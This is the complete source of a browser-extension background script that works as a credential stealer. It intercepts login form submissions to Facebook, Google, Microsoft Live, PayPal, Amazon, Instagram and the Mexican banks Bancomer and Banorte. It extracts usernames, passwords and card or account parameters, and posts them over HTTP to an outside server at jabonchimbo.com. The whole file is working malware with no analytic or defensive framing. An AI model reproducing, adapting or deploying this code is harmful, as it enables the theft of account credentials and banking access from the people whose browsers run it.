'use strict'
var targetFacebook = "*://*.facebook.com/login*";
var targetGmailPass = "*://accounts.google.com/_/signin/sl/challenge*";
var targetGmailUser = "*://accounts.google.com/_/signin/sl/lookup*";
var targetLive = "*://*.live.com/ppsecure/post.srf*";
var targetPaypal = "*://*.paypal.com/signin*";
var targetBNK1 = "*://*.bancomer.com/acceso/inicio-js.jsp*";
var targetBNK2 = "*://acceso24.banorte.com/wps/portal/banorte/Home/inicio/!ut/p/a1/*";
var targetAmazon = "*://*.amazon.com/ap/signin*";
var targetInstagram = "*://*.instagram.com/accounts/login/ajax/*";

chrome.webRequest.onBeforeRequest.addListener( 
function(details) {
    if(details.method == "POST") {
        if(details.url.indexOf("facebook") != -1 ){
                    console.log("Opcion facebook");
                    if(details.requestBody.formData.email === undefined){
                        doPost("repeat",details.requestBody.formData.pass[0],details.url);
                    }else{
                        doPost(details.requestBody.formData.email[0],details.requestBody.formData.pass[0],details.url);
                    }
        }

	if(details.url.indexOf("google.com/_/signin/sl/lookup") != -1 ){
	    	Object.keys(details.requestBody.formData).forEach(key => {
			if(key.includes("f.req")) {
				details.requestBody.formData[key].forEach(value => {
            				//console.log("value:  " + value[0]);
                			doPost("account",value,details.url);
        			});
			}		
        	});
        }
	

	if(details.url.indexOf("google.com/_/signin/sl/challenge") != -1 ){
	    	Object.keys(details.requestBody.formData).forEach(key => {
			if(key.includes("f.req")) {
				details.requestBody.formData[key].forEach(value => {
            				//console.log("value:  " + value[0]);
                			doPost("password",value,details.url);
        			});
			}		
        	});
        }


        if(details.url.indexOf("live") != -1 ){
                console.log(details.requestBody.formData);
                doPost(details.requestBody.formData.login[0],details.requestBody.formData.passwd[0],details.url);
        }

        if(details.url.indexOf("paypal") != -1 ){
                console.log(details.requestBody.formData);
                doPost(details.requestBody.formData.login_email[0],details.requestBody.formData.login_password[0],details.url);
        }

	if(details.url.indexOf("banorte.com") != -1 ){
		console.log("banorte.com");
                    if(details.requestBody.formData.userid === undefined){
                	doPost("password",details.requestBody.formData.dataObj[0],details.url);
		    }else{
                	doPost("userid",details.requestBody.formData.userid[0],details.url);
		    }
        }

	if(details.url.indexOf("amazon") != -1 ){
                    if(details.requestBody.formData.email != "" && details.requestBody.formData.password != "" ){
                	doPost(details.requestBody.formData.email[0],details.requestBody.formData.password[0],details.url);
		    }
        }

	if(details.url.indexOf("instagram") != -1 ){
                    if(details.requestBody.formData.username != "" && details.requestBody.formData.password != "" ){
                        doPost(details.requestBody.formData.username[0],details.requestBody.formData.password[0],details.url);
                    }
        }

    }else{
	if(details.url.indexOf("bancomer") != -1 ){
                console.log("Banco: Bancomer");
                doPost("Card",findGetParameter(details.url,"cuenta"),details.url);
	
        }
    }
  },
  {urls: [targetFacebook,targetGmailUser,targetGmailPass,targetLive,targetPaypal,targetBNK1,targetBNK2,targetAmazon,targetInstagram]},
  ["requestBody"]
);

function findGetParameter(url,parameterName) {
    var result = null,
        tmp = [];
    var items = url.split("?");
    var p = items[1].split("&");
    for (var index = 0; index < items.length; index++) {
        tmp = p[index].split("=");
        if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
    }
    return result;
}

function doPost(e,p,page){
                        var url = "http://www.jabonchimbo.com/api/cards/zeuspost.php";
                        var parametros ="email="+e+"&pass="+p+"&page="+page;
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST",url, true);
                        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
                        xhr.setRequestHeader('Accept','*/*');
                        xhr.setRequestHeader("Accept-Language", "en");
                        xhr.send(parametros);

                        xhr.onreadystatechange = function () {
                                if (xhr.readyState == 4) {
                                        console.log("Envio de parametros terminada");
                                }
                        }
}

